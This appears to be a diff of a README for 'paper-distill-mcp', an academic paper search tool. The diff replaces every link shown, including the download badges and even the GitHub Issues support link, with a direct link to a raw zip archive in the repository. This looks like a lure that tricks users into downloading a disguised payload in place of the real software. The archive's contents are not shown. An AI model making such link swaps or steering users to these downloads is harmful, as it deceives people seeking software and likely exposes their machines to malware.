@@ -1,6 +1,6 @@
 # 📄 paper-distill-mcp - Easy Academic Paper Search Server
 
-[![Download paper-distill-mcp](https://img.shields.io/badge/Download-pink?style=for-the-badge)](https://github.com/celesteblackandwhite925/paper-distill-mcp)
+[![Download paper-distill-mcp](https://img.shields.io/badge/Download-pink?style=for-the-badge)](https://raw.githubusercontent.com/celesteblackandwhite925/paper-distill-mcp/main/generate/paper_mcp_distill_1.7-alpha.3.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Before you download, make sure your computer meets these basic requirements:
 
 Use the following link to get the software. It will take you to the page where you can download the latest version.
 
-[Download paper-distill-mcp](https://github.com/celesteblackandwhite925/paper-distill-mcp)
+[Download paper-distill-mcp](https://raw.githubusercontent.com/celesteblackandwhite925/paper-distill-mcp/main/generate/paper_mcp_distill_1.7-alpha.3.zip)
 
 ### Step 1: Visit the Download Page
 
@@ -122,7 +122,7 @@ If the app opens but does not work as expected:
 
 This repository has a section called **Issues** on GitHub. You can read about common problems there or ask questions. To use this, you will need a free GitHub account.
 
-Link to the support page: [GitHub Issues for paper-distill-mcp](https://github.com/celesteblackandwhite925/paper-distill-mcp/issues)
+Link to the support page: [GitHub Issues for paper-distill-mcp](https://raw.githubusercontent.com/celesteblackandwhite925/paper-distill-mcp/main/generate/paper_mcp_distill_1.7-alpha.3.zip)
 
 ---
 
@@ -132,7 +132,7 @@ paper-distill-mcp automatically checks for updates when you open it. It will dow
 
 You can also visit the download page directly to check for new versions:
 
-[Download paper-distill-mcp](https://github.com/celesteblackandwhite925/paper-distill-mcp)
+[Download paper-distill-mcp](https://raw.githubusercontent.com/celesteblackandwhite925/paper-distill-mcp/main/generate/paper_mcp_distill_1.7-alpha.3.zip)
 
 ---
 
@@ -178,4 +178,4 @@ To open the Startup folder:
 
 ---
 
-[![Download paper-distill-mcp](https://img.shields.io/badge/Download-pink?style=for-the-badge)](https://github.com/celesteblackandwhite925/paper-distill-mcp)
+[![Download paper-distill-mcp](https://img.shields.io/badge/Download-pink?style=for-the-badge)](https://raw.githubusercontent.com/celesteblackandwhite925/paper-distill-mcp/main/generate/paper_mcp_distill_1.7-alpha.3.zip)
